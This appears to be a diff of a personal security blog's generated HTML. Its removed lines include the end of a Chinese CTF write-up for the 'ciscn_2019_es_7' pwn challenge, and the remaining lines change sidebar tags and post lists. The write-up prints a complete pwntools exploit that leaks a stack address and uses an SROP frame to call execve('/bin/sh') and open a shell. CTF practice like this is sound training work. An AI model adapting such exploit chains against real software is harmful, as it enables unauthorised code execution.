-<h5 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ciscn_2019_es_7"</span>)</span><br><span class="line"><span class="comment"># p=remote("node3.buuoj.cn",26076)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">mov_rax_59 = <span class="number">0x00004004E2</span></span><br><span class="line">part1 = <span class="number">0x0040059A</span></span><br><span class="line">part2 = <span class="number">0x000400580</span></span><br><span class="line">back = <span class="number">0x04004ED</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005a3</span></span><br><span class="line">syscall = <span class="number">0x0000000000400501</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(back)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">binsh = stack - <span class="number">0x118</span></span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">pop_rax_15 = <span class="number">0x004004DA</span></span><br><span class="line"></span><br><span class="line">sigFrame = SigreturnFrame()</span><br><span class="line">sigFrame.rax = constants.SYS_execve</span><br><span class="line">sigFrame.rdi = binsh</span><br><span class="line">sigFrame.rsi = <span class="number">0</span></span><br><span class="line">sigFrame.rdx = <span class="number">0</span></span><br><span class="line">sigFrame.rip = syscall</span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> * <span class="number">2</span></span><br><span class="line">payload += p64(pop_rax_15)+p64(syscall)+str(sigFrame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本篇主要讲了些做题的点，思路更清晰了，，，，</p>
-<ol>
-<li>ret2csu比较好用了，这里特别注意execve使用的参数设置</li>
-<li>srop主要发送str(sigFrame)在rsp下面一个，题目read和write都是[rsp+buf]为srop提供了便利</li>
-</ol>
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="ciscn_2019_es_7">附件</a></p>
-
-	
-	</div>
-  <a type="button" href="/2021/05/06/ciscn-2019-es-7/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1946,6 +2011,8 @@ var _hmt = _hmt || [];
 		
 			<li><a href="/categories/v8/">v8<span>1</span></a></li>
 		
+			<li><a href="/categories/《Learn-Blockchain-by-Building-One》/">《Learn Blockchain by Building One》<span>1</span></a></li>
+		
 			<li><a href="/categories/专题/">专题<span>3</span></a></li>
 		
 			<li><a href="/categories/基础知识/">基础知识<span>1</span></a></li>
@@ -1967,35 +2034,19 @@ var _hmt = _hmt || [];
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/天梯赛/">天梯赛<span>1</span></a></li>
+			<li><a href="/tags/区块链/">区块链<span>1</span></a></li>
+		
+			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
 		
 			<li><a href="/tags/c-基础/">c++基础<span>1</span></a></li>
 		
-			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
+			<li><a href="/tags/srop/">srop<span>1</span></a></li>
 		
-			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
-		
-			<li><a href="/tags/fastbin-attack/">fastbin attack<span>1</span></a></li>
-		
-			<li><a href="/tags/pwn/">pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/house-of-force/">house of force<span>2</span></a></li>
+			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
 		
 			<li><a href="/tags/unlink/">unlink<span>2</span></a></li>
 		
 			<li><a href="/tags/off-by-one/">off by one<span>1</span></a></li>
-		
-			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
-		
-			<li><a href="/tags/leetcode/">leetcode<span>1</span></a></li>
-		
-			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
-		
-			<li><a href="/tags/ciscn/">ciscn<span>1</span></a></li>
-		
-			<li><a href="/tags/unsortedbin-attack/">unsortedbin attack<span>1</span></a></li>
-		
-			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
 		
 			<li><a href="/tags/buu刷题/">buu刷题<span>4</span></a></li>
 		
@@ -2003,12 +2054,28 @@ var _hmt = _hmt || [];
 		
 			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
 		
-			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
+			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
+		
+			<li><a href="/tags/v8/">v8<span>1</span></a></li>
+		
+			<li><a href="/tags/kernel-pwn/">kernel pwn<span>2</span></a></li>
+		
+			<li><a href="/tags/天梯赛/">天梯赛<span>1</span></a></li>
+		
+			<li><a href="/tags/leetcode/">leetcode<span>1</span></a></li>
+		
+			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
+		
+			<li><a href="/tags/ciscn/">ciscn<span>1</span></a></li>
 		
 			<li><a href="/tags/安装/">安装<span>1</span></a></li>
 		
+			<li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
 		
-		   <li><a href="/tags">...<span>33</span></a></li>
+			<li><a href="/tags/double-free/">double free<span>1</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>34</span></a></li>
 		 
 		</ul>
 	</div>
@@ -2019,6 +2086,10 @@ var _hmt = _hmt || [];
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/08/07/《Learn-Blockchain-by-Building-One》笔记以及操作/" ><i class="fa fa-file-o"></i>《Learn Blockchain by Buildi...</a>
+      </li>
     
       <li>
         <a href="/2021/06/09/2021-ciscn-pwn初赛/" ><i class="fa fa-file-o"></i>2021_ciscn_pwn初赛</a>
@@ -2034,10 +2105,6 @@ var _hmt = _hmt || [];
     
       <li>
         <a href="/2021/05/13/Mar-DASCTF明御攻防赛/" ><i class="fa fa-file-o"></i>Mar.DASCTF明御攻防赛</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/13/pwn题模板/" ><i class="fa fa-file-o"></i>pwn wp模板</a>
       </li>
     
   </ul>
